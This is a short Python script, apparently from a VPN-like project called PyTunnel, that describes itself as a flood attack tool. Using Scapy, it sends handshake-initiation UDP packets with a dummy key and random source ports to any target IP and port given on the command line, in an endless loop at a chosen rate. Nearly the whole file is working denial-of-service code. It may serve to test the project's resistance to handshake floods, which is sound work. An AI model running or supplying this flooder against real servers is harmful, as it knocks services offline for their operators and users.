#!/usr/bin/env python3
import argparse
import socket
from scapy.all import *
from pytunnel.common import proto

def main():
    parser = argparse.ArgumentParser(description="PyTunnel flood attack tool.")
    parser.add_argument("--target", required=True, help="Target server IP.")
    parser.add_argument("--port", type=int, default=51820, help="Target server port.")
    parser.add_argument("--rate", type=int, default=100, help="Packets per second.")
    args = parser.parse_args()

    print(f"Flooding {args.target}:{args.port} with MSG_INIT packets at {args.rate} pps.")

    # We use raw sockets with Scapy for sending packets
    # A real attacker might use something faster.
    
    eph_pubkey = b'\x00' * 32 # Attacker doesn't need a real key
    msg = proto.pack_msg_init(eph_pubkey)
    
    packet = IP(dst=args.target) / UDP(dport=args.port, sport=RandShort()) / Raw(load=msg)
    
    send(packet, loop=1, inter=1.0/args.rate, verbose=True)

if __name__ == "__main__":
    main()
